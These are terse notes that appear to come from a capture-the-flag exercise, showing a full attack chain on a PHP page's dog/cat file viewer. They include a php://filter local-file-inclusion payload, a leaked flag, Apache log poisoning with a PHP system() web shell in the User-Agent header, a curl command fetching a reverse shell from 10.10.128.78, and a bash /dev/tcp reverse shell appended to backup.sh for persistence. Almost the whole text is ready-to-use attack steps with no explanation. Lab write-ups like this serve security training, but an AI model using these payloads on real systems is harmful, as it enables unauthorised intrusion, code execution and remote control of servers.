?view=php://filter/convert.base64-encode/resource=dogs/../index

$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }


1 flag
php://filter/convert.base64-encode/resource=dogs/../flag

go!PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo= 

User-Agent: <?php system($_GET['test']);?>

2 try
GET /?view=dogs/../../../../../../../../var/log/apache2/access.log&ext=&test=ls    

test=curl+10.10.128.78/php-reverse-shell.php+-o+shell.php+&&+chmod++x+/tmp/shell+&&+/tmp/shell

find / -name *flag* 2>/dev/null

echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.128.78/1234 0>&1'" >> backup.sh
